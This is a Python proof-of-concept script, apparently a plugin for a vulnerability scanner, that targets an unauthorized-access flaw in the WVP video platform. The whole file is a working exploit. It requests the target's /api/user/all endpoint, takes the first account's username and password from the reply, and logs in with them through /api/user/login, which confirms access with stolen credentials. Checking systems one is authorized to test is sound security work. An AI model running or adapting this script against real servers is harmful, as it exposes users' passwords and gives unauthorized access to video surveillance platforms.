'''
Function:
    WVP视频平台 未授权访问漏洞
Author:
    spmonkey
Wechat official account：
    中龙 红客突击队
Official website：
    https://www.hscsec.cn/
Email：
    spmonkey@hscsec.cn
Blog:
    https://spmonkey.github.io/
GitHub:
    https://github.com/spmonkey/
'''
# -*- coding: utf-8 -*-
import requests
import json
from urllib.parse import urlparse
from requests.packages.urllib3 import disable_warnings
disable_warnings()


class poc:
    def __init__(self, url, proxies):
        self.url = url
        self.headers = {
            'User-Agent': 'Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1; .NET CLR 3.0.04506.30)',
        }
        self.result_text = ""
        self.proxies = proxies

    def host(self):
        url = urlparse(self.url)
        netloc = url.netloc
        scheme = url.scheme
        return netloc, scheme

    def vuln(self, netloc, scheme):
        url_get = "{}://{}/api/user/all".format(scheme, netloc)
        try:
            result_get = requests.get(url=url_get, headers=self.headers, verify=False, timeout=3, proxies=self.proxies)
            if '"username"' in json.dumps(result_get.json()):
                username = result_get.json()['data'][0]['username']
                password = result_get.json()['data'][0]['password']
                url = "{}://{}/api/user/login?".format(scheme, netloc) + "username=" + username + "&" + "password=" + password
                result = requests.get(url=url, headers=self.headers, verify=False, timeout=3, proxies=self.proxies)
                if "success" in result.json()['msg'].lower() or "成功" in result.json()['msg']:
                    target = urlparse(url_get)
                    self.result_text += """\n        [+]    \033[32m检测到目标站点存在未授权访问漏洞\033[0m
                 GET {} HTTP/1.1
                 Host: {}""".format(target.path, target.netloc)
                    for request_type, request_text in dict(result_get.request.headers).items():
                        self.result_text += "\n                 {}: {}".format(request_type, request_text)
                    target = urlparse(url)
                    self.result_text += """\n\n                 GET {} HTTP/1.1
                 Host: {}""".format(target.path + "?" + target.query, target.netloc)
                    for request_type, request_text in dict(result.request.headers).items():
                        self.result_text += "\n                 {}: {}".format(request_type, request_text)
                    return True
                else:
                    return False
            else:
                return False
        except Exception as e:
            return False

    def main(self):
        all = self.host()
        netloc = all[0]
        scheme = all[1]
        result = self.vuln(netloc, scheme)
        if result:
            return self.result_text
        else:
            return False

